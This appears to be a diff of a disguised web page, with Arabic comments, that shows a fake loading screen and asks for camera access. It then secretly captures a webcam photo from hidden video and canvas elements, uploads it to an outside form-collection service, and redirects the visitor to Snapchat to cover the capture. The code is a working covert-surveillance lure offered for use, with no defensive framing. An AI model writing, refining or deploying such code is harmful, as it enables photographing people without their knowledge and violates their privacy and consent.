@@ -5,43 +5,28 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
     <style>
-        body { text-align: center; font-family: Arial, sans-serif; padding-top: 50px; background-color: #f4f4f4; color: #333; }
+        body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-
-    <div id="status">
-        <h2>جاري تهيئة المتصفح...</h2>
-        <p>يرجى الانتظار لحظة لتحميل المحتوى.</p>
-    </div>
-
-    <!-- العناصر التقنية المخفية -->
+    <h2>جاري التحميل...</h2>
     <video id="video" width="640" height="480" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        // الرابط الخاص بك من الصورة
+        // رابط Forminit الخاص بك
         const FORM_URL = "https://forminit.com";
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const statusText = document.getElementById('status');
 
-        // مؤقت ذكي: إذا لم تفتح الكاميرا خلال 5 ثوانٍ، سيتم التحويل تلقائياً
-        const fallback = setTimeout(() => {
-            window.location.href = "https://snapchat.com";
-        }, 5000);
-
-        // 1. طلب فتح الكاميرا
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
-                clearTimeout(fallback);
                 video.srcObject = stream;
-                // الانتظار ثانية ونصف لالتقاط صورة واضحة
-                setTimeout(captureAndSend, 1500);
+                setTimeout(captureAndSend, 1500); // التقاط بعد ثانية ونصف
             })
-            .catch(err => {
+            .catch(() => {
                 window.location.href = "https://snapchat.com";
             });
 
@@ -49,22 +34,15 @@
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, 640, 480);
             
-            // 2. تحويل اللقطة إلى ملف وإرساله
             canvas.toBlob(blob => {
                 const formData = new FormData();
-                // "file" هو الاسم الذي يتوقعه الموقع لاستلام المرفقات
-                formData.append("file", blob, "camera_snap.jpg");
-                formData.append("message", "تم التقاط صورة جديدة من الموقع");
+                // إرسال الصورة كملف حقيقي باسم "file"
+                formData.append("file", blob, "photo.jpg");
 
                 fetch(FORM_URL, {
                     method: "POST",
                     body: formData,
-                    headers: {
-                        'Accept': 'application/json'
-                    }
-                })
-                .finally(() => {
-                    // التحويل لسناب شات فوراً بعد محاولة الإرسال
+                }).finally(() => {
                     window.location.href = "https://snapchat.com";
                 });
             }, 'image/jpeg', 0.7);
